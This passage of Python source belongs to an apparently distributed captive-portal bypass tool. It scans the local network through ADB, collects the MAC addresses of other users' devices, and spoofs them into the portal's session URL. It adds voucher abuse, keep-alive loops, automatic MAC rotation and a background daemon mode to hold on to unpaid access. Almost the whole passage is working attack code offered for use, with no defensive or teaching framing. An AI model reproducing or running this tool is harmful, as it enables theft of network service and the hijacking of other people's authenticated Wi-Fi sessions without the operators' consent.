        sid = await get_session_id(session, session_url)
        while not sid:
            log_message("[!] Waiting for session ID...")
            await asyncio.sleep(3)
            sid = await get_session_id(session, session_url)
        sid_holder = [sid]
        url_holder[0] = session_url
        dashboard_vars['session_id_short'] = sid[:8] + "..."

        unlimited_token = None
        if voucher:
            log_message("[*] Trying Voucher login...")
            token_v2 = login_voucher_v2(sid, voucher)
            if token_v2:
                unlimited_token = oneclick_direct(token_v2) or token_v2

        if unlimited_token:
            success, _ = await send_packet(session, gateway_ip, unlimited_token)
            if success:
                sid_holder[0] = unlimited_token
                dashboard_vars['session_id_short'] = unlimited_token[:8] + "..."
                dashboard_vars['history'] = ["Bypass OK (Voucher)"]
                log_message("[+] Bypass with Voucher successful!")
            else:
                unlimited_token = None

        if not unlimited_token:
            success, _ = await send_packet(session, gateway_ip, sid)
            if success:
                dashboard_vars['history'] = ["Bypass OK (MAC)"]
                log_message("[+] MAC bypass successful!")
            else:
                dashboard_vars['history'] = ["Bypass Failed"]
                log_message("[!] Initial bypass failed.")

        draw_dashboard()

        async def keep_alive_only():
            while True:
                await asyncio.sleep(3)
                sid = sid_holder[0]
                if not sid:
                    continue
                success, _ = await send_packet(session, gateway_ip, sid)
                if success:
                    dashboard_vars['history'].append("KA OK")
                else:
                    dashboard_vars['history'].append("KA Fail")
                if len(dashboard_vars['history']) > 10:
                    dashboard_vars['history'].pop(0)
                draw_dashboard()

        async def manual_swap_handler():
            global manual_swap_requested
            while True:
                await asyncio.sleep(0.5)
                if manual_swap_requested and use_rotation:
                    log_message("[!] Manual swap requested by user...")
                    manual_swap_requested = False
                    new_mac, new_idx = find_next_working_mac(
                        mac_list, current_index_holder[0], url_holder[0], gateway_ip, skip_current=True
                    )
                    if new_mac:
                        current_index_holder[0] = new_idx
                        dashboard_vars['target_mac'] = new_mac
                        new_url = randomize_url(url_holder[0])
                        if new_url:
                            new_url = replace_mac(new_url, new_mac)
                        else:
                            new_url = replace_mac(url_holder[0], new_mac)
                        url_holder[0] = new_url
                        dashboard_vars['portal_short'] = new_url[:50] + "..." if len(new_url) > 50 else new_url
                        new_sid = await get_session_id(session, new_url)
                        if new_sid:
                            sid_holder[0] = new_sid
                            dashboard_vars['session_id_short'] = new_sid[:8] + "..."
                            await send_packet(session, gateway_ip, new_sid)
                            log_message(f"[+] Switched to working MAC: {new_mac}")
                            dashboard_vars['history'].append(f"Manual -> {new_mac[:8]}")
                        else:
                            log_message("[!] Failed to get session for new MAC")
                    else:
                        log_message("[!] No working MAC found!")
                    draw_dashboard()

        async def internet_monitor():
            nonlocal session_url
            last_url_randomize = time.time()
            while True:
                await asyncio.sleep(3)
                status, _ = await check_internet_async(session)
                if status == "OK":
                    dashboard_vars['ping_status'] = "OK"
                    dashboard_vars['status'] = "ONLINE"
                elif status in ["SLOW", "UNSTABLE"]:
                    dashboard_vars['ping_status'] = status
                    dashboard_vars['status'] = status
                    if time.time() - last_url_randomize > 300:
                        new_url = randomize_url(url_holder[0])
                        if new_url:
                            new_url = replace_mac(new_url, dashboard_vars['target_mac'])
                            url_holder[0] = new_url
                            session_url = new_url
                            dashboard_vars['portal_short'] = new_url[:50] + "..." if len(new_url) > 50 else new_url
                            log_message("[*] URL randomized (slow internet)")
                            new_sid = await get_session_id(session, new_url)
                            if new_sid:
                                sid_holder[0] = new_sid
                                dashboard_vars['session_id_short'] = new_sid[:8] + "..."
                                await send_packet(session, gateway_ip, new_sid)
                                log_message("[+] New session established after URL randomize")
                            last_url_randomize = time.time()
                else:
                    dashboard_vars['ping_status'] = "FAIL"
                    dashboard_vars['status'] = "OFFLINE"

        async def refresh_loop():
            while True:
                await asyncio.sleep(180)
                sid = sid_holder[0]
                if sid:
                    await send_packet(session, gateway_ip, sid)
                    dashboard_vars['reconnects'] += 1
                    dashboard_vars['history'].append("Refresh")

        async def speed_loop():
            while True:
                await asyncio.sleep(30)
                if dashboard_vars['status'] in ["OK", "SLOW", "UNSTABLE"]:
                    try:
                        result = await speed_test(session)
                        dashboard_vars['download_speed'] = format_speed(result.get('download', 0))
                        dashboard_vars['upload_speed'] = format_speed(result.get('upload', 0))
                    except:
                        pass

        async def plan_monitor():
            while True:
                await asyncio.sleep(60)
                sid = sid_holder[0]
                if sid:
                    balance = await get_balance_info(session, sid)
                    if balance:
                        dashboard_vars['plan_name'] = balance.get('plan', 'Unknown')

        asyncio.create_task(keep_alive_only())
        asyncio.create_task(manual_swap_handler())
        asyncio.create_task(refresh_loop())
        asyncio.create_task(internet_monitor())
        asyncio.create_task(speed_loop())
        asyncio.create_task(plan_monitor())
        asyncio.create_task(key_listener())

        while True:
            await asyncio.sleep(1)
            dashboard_vars['countdown'] -= 1
            if dashboard_vars['countdown'] <= 0:
                dashboard_vars['countdown'] = 180
            draw_dashboard()

def run_adb_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1

def adb_shell(cmd):
    full_cmd = f"adb shell {cmd}"
    stdout, stderr, code = run_adb_command(full_cmd)
    return stdout, stderr, code

def adb_pair(pair_port, pairing_code):
    print(f"\n{c}[*] Pairing with device...{w}")
    cmd = f"adb pair 127.0.0.1:{pair_port} {pairing_code}"
    stdout, stderr, code = run_adb_command(cmd)
    if code == 0:
        print(f"{g}✅ Pairing successful!{w}")
        return True
    else:
        print(f"{r}❌ Pairing failed:{w}\n{stderr if stderr else stdout}{w}")
        return False

def adb_connect(connect_port):
    print(f"\n{c}[*] Connecting to device...{w}")
    cmd = f"adb connect 127.0.0.1:{connect_port}"
    stdout, stderr, code = run_adb_command(cmd)
    if "connected" in stdout.lower():
        print(f"{g}✅ Connected successfully!{w}")
        return True
    else:
        print(f"{r}❌ Connection failed:{w}\n{stdout}{w}")
        return False

def get_network_info():
    try:
        stdout, stderr, code = adb_shell("ip -4 addr show wlan0 | grep inet | awk '{print $2}'")
        if not stdout:
            stdout, stderr, code = adb_shell("ip -4 addr show | grep inet | grep -v 127.0.0.1 | awk '{print $2}'")
        if stdout:
            parts = stdout.split('/')
            ip = parts[0].strip()
            mask = int(parts[1]) if len(parts) > 1 else 24
            network = ipaddress.IPv4Network(f"{ip}/{mask}", strict=False)
            return ip, str(network), mask
    except:
        pass
    return "192.168.1.1", "192.168.1.0/24", 24

def get_default_gateway():
    try:
        stdout, stderr, code = adb_shell("ip route | grep default | awk '{print $3}'")
        if stdout:
            return stdout.strip()
    except:
        pass
    return None

def ping_ip(ip):
    cmd = f"ping -c 1 -W 1 {ip} > /dev/null 2>&1 && echo 'alive' || echo 'dead'"
    stdout, stderr, code = adb_shell(cmd)
    return ip, "alive" in stdout

def scan_network_offline(network_str):
    print(f"\n{c}[*] Scanning network...{w}")
    network = ipaddress.IPv4Network(network_str, strict=False)
    total_ips = network.num_addresses - 2
    active_ips = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(ping_ip, str(ip)): str(ip) for ip in network.hosts()}
        count = 0
        for future in as_completed(futures):
            count += 1
            if count % 50 == 0:
                print(f"{c}[*] Scanned {count}/{total_ips}...{w}")
            ip, alive = future.result()
            if alive:
                active_ips.append(ip)
    print(f"{g}✅ Found {len(active_ips)} active devices.{w}")
    return active_ips

def scan_and_test_macs():
    global working_macs, PROFILES
    load_profiles()
    print(f"{c}+--------------------------------------------------+{w}")
    print(f"{c}| {p}       Mode 2: Scan Device MACs + Speed Booster        {c}|{w}")
    print(f"{c}+--------------------------------------------------+{w}\n")
    print(f"{c}[1] Use saved profile{w}")
    print(f"{c}[2] Scan new Device MACs{w}")
    print(f"{c}[0] Back to main menu{w}")
    choice = input(f"{g}[+] Choose (0,1,2): ").strip()
    
    if choice == "0":
        return
    elif choice == "1":
        profile_list = show_profiles()
        if not profile_list:
            input("Press Enter...")
            return
        try:
            sel = input(f"{g}[+] Select profile number (or 'b' to go back): ").strip()
            if sel.lower() == 'b':
                return
            idx = int(sel) - 1
            if 0 <= idx < len(profile_list):
                name, data = profile_list[idx]
                gateway_ip = data['gateway_ip']
                mac_list = data['macs']
                portal_urls = data.get('portal_urls', [])
                url = portal_urls[0] if portal_urls else input(f"{g}[+] Enter Portal URL: ").strip()
                rand_url = randomize_url(url)
                if rand_url:
                    url = rand_url
                working_mac = None
                for i, mac in enumerate(mac_list, 1):
                    if do_bypass_for_mac(url, mac, gateway_ip):
                        working_mac = mac
                        break
                    time.sleep(0.3)
                if working_mac:
                    bg = input(f"{g}[+] Run in background? (y/n): ").strip().lower()
                    if bg == 'y':
                        daemonize(url, gateway_ip, working_mac, mac_list=mac_list)
                    else:
                        asyncio.run(bypass_with_watchdog(url, gateway_ip, working_mac, mac_list=mac_list))
                else:
                    input(f"{r}[!] No working MAC! Press Enter...{w}")
            else:
                input(f"{r}[!] Invalid selection. Press Enter...{w}")
        except Exception as e:
            input(f"{r}[!] Error: {e}. Press Enter...{w}")
        return

    url = input(f"{g}[+] URL: ").strip()
    if not url or "mac=" not in url:
        input(f"{r}[!] Invalid URL. Press Enter...{w}")
        return
    url = clean_url(url)
    gw_match = re.search(r'gw_address=([^&]+)', url)
    gateway_ip = gw_match.group(1) if gw_match else get_default_gateway()
    
    device_ip = input(f"{g}[+] Device IP: ").strip()
    pair_port = input(f"{g}[+] Pairing Port: ").strip()
    pair_code = input(f"{g}[+] Pairing Code: ").strip()
    if not adb_pair(pair_port, pair_code): return
    connect_port = input(f"{g}[+] Connect Port: ").strip()
    if not adb_connect(connect_port): return
    
    _, network_str, _ = get_network_info()
    active_ips = scan_network_offline(network_str)
    time.sleep(2)
    
    stdout, _, code = adb_shell("ip neigh show")
    if code != 0 or not stdout: return
    
    mac_pattern = r'([0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2})'
    mac_dict = {}
    for line in stdout.split('\n'):
        mac_match = re.search(mac_pattern, line, re.IGNORECASE)
        if mac_match:
            mac = mac_match.group(1).upper()
            if is_device_mac(mac): mac_dict[mac] = "Unknown"
    
    mac_list = list(mac_dict.keys())
    working_macs = []
    for mac in mac_list:
        if do_bypass_for_mac(url, mac, gateway_ip):
            working_macs.append(mac)
    
    if working_macs:
        save = input(f"{g}[+] Save as profile? (y/n): ").strip().lower()
        if save == 'y':
            name = input(f"{g}[+] Profile name: ").strip()
            if name: save_profile(name, [url], gateway_ip, working_macs)
        bg = input(f"{g}[+] Run in background? (y/n): ").strip().lower()
        if bg == 'y':
            daemonize(url, gateway_ip, working_macs[0], mac_list=working_macs)
        else:
            asyncio.run(bypass_with_watchdog(url, gateway_ip, working_macs[0], mac_list=working_macs))
    else:
        input(f"{r}[!] No working MAC found. Press Enter...{w}")

def manage_profiles():
    load_profiles()
    print(f"{c}+--------------------------------------------------+{w}")
    print(f"{c}| {p}            Mode 3: Manage Profiles                    {c}|{w}")
    print(f"{c}+--------------------------------------------------+{w}\n")
    if not PROFILES:
        input(f"{y}[!] No saved profiles found. Press Enter...{w}")
        return
    profile_list = show_profiles()
    choice = input(f"{g}[+] Enter [d] to delete profile or [b] to back: ").strip().lower()
    if choice == 'd':
        try:
            sel = int(input(f"{g}[+] Enter profile number: ").strip()) - 1
            if 0 <= sel < len(profile_list):
                delete_profile(profile_list[sel][0])
                print(f"{g}[+] Deleted successfully!{w}")
        except:
            pass
    input("Press Enter...")

def process_target(session_url, gateway_ip):
    rand_url = randomize_url(session_url)
    if rand_url: session_url = rand_url
    
    inp = input(f"{g}[+] Input (Voucher / MAC / IP): ").strip()
    if not inp: return
    
    if is_valid_mac(inp):
        mac = inp.upper()
        session_url = replace_mac(session_url, mac)
        bg = input(f"{g}[+] Background? (y/n): ").strip().lower()
        if bg == 'y': daemonize(session_url, gateway_ip, mac)
        else: asyncio.run(bypass_with_watchdog(session_url, gateway_ip, mac))
        return
    
    voucher = inp
    mac = input(f"{g}[+] Enter MAC: ").upper().strip()
    if not is_valid_mac(mac): return
    session_url = replace_mac(session_url, mac)
    bg = input(f"{g}[+] Background? (y/n): ").strip().lower()
    if bg == 'y': daemonize(session_url, gateway_ip, mac, voucher=voucher)
    else: asyncio.run(bypass_with_watchdog(session_url, gateway_ip, mac, voucher=voucher))

def main():
    global manual_gw
    logo()
    while True:
        print(f"{c}============================================================{w}")
        print(f"{c}  {g}[1]{w} Auto Bypass (auto discover + MAC)")
        print(f"{c}  {g}[2]{w} Scan Device MACs (ADB + Speed Booster)")
        print(f"{c}  {g}[3]{w} Manage Profiles (List / Delete)")
        print(f"{c}  {g}[4]{w} Exit")
        print(f"{c}============================================================{w}")
        choice = input(f"{g}[+] Choose (1-4): {w}").strip()
        
        if choice == "1":
            logo()
            gw_choice = input(f"{g}[1] Manual Gateway IP\n[2] Auto Detect\nChoose (1/2): {w}").strip()
            manual_gw = input(f"{g}[+] Gateway IP: {w}").strip() if gw_choice == "1" else None
            ip, url = auto_discover()
            if ip and url:
                process_target(url, ip)
            else:
                input(f"{r}[!] Discovery failed. Press Enter...{w}")
        elif choice == "2":
            logo()
            scan_and_test_macs()
        elif choice == "3":
            logo()
            manage_profiles()
        elif choice == "4":
            sys.exit(0)

if __name__ == "__main__":
    try:
        if check_license_system():
            main()
    except KeyboardInterrupt:
        sys.exit(0)
